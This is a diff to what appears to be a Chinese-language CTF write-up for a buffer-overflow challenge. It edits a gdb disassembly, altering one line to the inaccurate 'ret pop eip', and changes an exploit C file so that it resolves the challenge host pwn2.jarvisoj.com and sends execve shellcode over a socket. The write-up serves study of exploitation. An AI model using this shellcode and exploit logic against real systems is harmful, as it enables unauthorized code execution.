@@ -123,7 +123,8 @@ Dump of assembler code for function vulnerable_function:
    0x080484b1 <+54>:	add    esp,0x10
    0x080484b4 <+57>:	nop
    0x080484b5 <+58>:	leave  
-   0x080484b6 <+59>:	ret    
+   
+   0x080484b6 <+59>:	ret    pop eip
 End of assembler dump.
 (gdb) x/s 0x8048570
 0x8048570:	"What's this:%p?\n"
@@ -317,14 +318,15 @@ int main()
 
 ```c
 //exp.c
-#include <stdlib.h>//malloc, free
-#include <string.h>//strxxx
-#include <stdio.h>//printf scanf
+#include <stdlib.h>        //malloc, free
+#include <string.h>        //strxxx
+#include <stdio.h>         //printf scanf
 
-#include <sys/socket.h>//socket, connect, send, recv
-#include <arpa/inet.h>//inet_pton
-#include <netinet/in.h>//struct sockaddr, struct sockaddr_in
-#include <unistd.h>//close
+#include <sys/socket.h>    //socket, connect, send, recv
+#include <arpa/inet.h>     //inet_pton
+#include <netinet/in.h>    //struct sockaddr, struct sockaddr_in
+#include <unistd.h>        //sleep(), close()
+#include <netdb.h>         //gethostbyname(), struct hostent
 
 char shellcode[] =  "\x31\xc0"
 					"\x50"
@@ -337,11 +339,17 @@ char shellcode[] =  "\x31\xc0"
 					"\xb0\x0b"
 					"\xcd\x80";
 
-char *address = "45.248.85.153";
+const char *remote = "pwn2.jarvisoj.com";
 short port = 9877;
 
 int SendPayload(char* payload, int length)
 {
+	//
+	char address[INET_ADDRSTRLEN+1];
+	struct hostent *host = gethostbyname(remote);
+	inet_ntop(AF_INET, host->h_addr_list[0], address, INET_ADDRSTRLEN);
+	printf("resolved host: %s->%s\n", remote, address);
+
 	/*创建套接字，指定协议族为IPv4，创建字节流套接字，使用TCP协议*/
 	int socketfd = socket(AF_INET, SOCK_STREAM, 0);
 	struct sockaddr_in serverAddr;
@@ -448,9 +456,6 @@ int main()
 	free(payload);
 	return 0;
 }
-
-
-
 ```
 
 编译运行
